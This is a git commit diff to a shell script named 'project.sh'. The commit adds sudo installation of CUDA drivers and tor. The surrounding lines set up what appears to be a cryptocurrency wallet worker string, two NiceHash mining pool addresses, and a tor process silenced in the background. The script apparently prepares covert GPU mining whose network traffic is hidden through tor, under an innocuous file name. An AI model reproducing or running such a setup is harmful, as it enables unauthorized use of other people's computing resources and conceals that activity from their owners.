3d0eebf0c6128720e6611e445ed93cbc980f0789
taovuu1 <94132974+taovuu1@users.noreply.github.com>
2022-02-04 12:51:17 +0700

    Update project.sh

--- project.sh
+++ project.sh
@@ -1,11 +1,17 @@
 #!/bin/bash
 
+wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
+sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
+wget https://developer.download.nvidia.com/compute/cuda/11.6.0/local_installers/cuda-repo-ubuntu1804-11-6-local_11.6.0-510.39.01-1_amd64.deb
+sudo dpkg -i cuda-repo-ubuntu1804-11-6-local_11.6.0-510.39.01-1_amd64.deb
+sudo apt-key add /var/cuda-repo-ubuntu1804-11-6-local/7fa2af80.pub
+sudo apt-get update
+sudo apt-get install -y tor libpci-dev cuda
+
 string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$(nvidia-smi --query-gpu=name --format=csv,noheader)
 string2=$(echo $string | sed 's/ /_/g')
 pool1=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
 pool2=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
-
-apt install -y tor libpci-dev
 
 nohup tor &>/dev/null &
 
